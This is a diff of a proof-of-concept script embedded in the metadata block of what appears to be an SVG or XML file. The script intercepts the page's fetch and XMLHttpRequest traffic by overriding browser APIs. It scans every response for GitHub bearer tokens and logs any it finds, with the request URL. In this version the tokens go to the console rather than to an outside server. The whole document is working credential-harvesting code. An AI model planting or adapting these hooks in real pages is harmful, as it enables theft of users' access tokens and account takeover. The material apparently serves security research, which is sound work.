@@ -7,36 +7,50 @@
 
         const RX = /\bGitHub-Bearer\s+[A-Za-z0-9._-]{60,}\b/;
 
-        /* --- 1. hook fetch requests (still useful if a header appears) --- */
+        // ── 1. Hook fetch responses (in case some APIs use fetch) ──
         const origFetch = window.fetch;
         window.fetch = new Proxy(origFetch, {
           async apply(t, th, args) {
             const res = await Reflect.apply(t, th, args);
-
-            /* --- 2. inspect the RESPONSE body for the bearer --- */
             try {
-              const clone = res.clone();                // don’t consume original
+              const clone = res.clone();
               const text  = await clone.text();
               const hit   = text.match(RX);
               if (hit) {
                 console.log('%c[PoC token via response]', 'color:red;font-weight:bold;', hit[0]);
               }
-            } catch { /* ignore binary / non-text */ }
-
-            /* --- 3. still look in request headers just in case --- */
-            try {
-              const [, init] = args;
-              const h = init?.headers || {};
-              const auth =
-                h.authorization || h.Authorization || h.get?.('authorization');
-              if (auth && RX.test(auth)) {
-                console.log('%c[PoC token via header]', 'color:red;font-weight:bold;', auth);
-              }
             } catch {}
-
             return res;
           }
         });
+
+        // ── 2. Hook XHR responses ──
+        const XHR = XMLHttpRequest.prototype;
+        const origOpen = XHR.open;
+        const origSend = XHR.send;
+        XHR.open = function(method, url) {
+          this.__url = url;
+          return origOpen.apply(this, arguments);
+        };
+        XHR.send = function(body) {
+          this.addEventListener('readystatechange', () => {
+            if (this.readyState === 4) {
+              try {
+                const text = this.responseText;
+                const hit  = text.match(RX);
+                if (hit) {
+                  console.log(
+                    '%c[PoC token via XHR response]',
+                    'color:red;font-weight:bold;',
+                    hit[0],
+                    'from', this.__url
+                  );
+                }
+              } catch {}
+            }
+          });
+          return origSend.apply(this, arguments);
+        };
       })();
     ]]>
   </metadata>
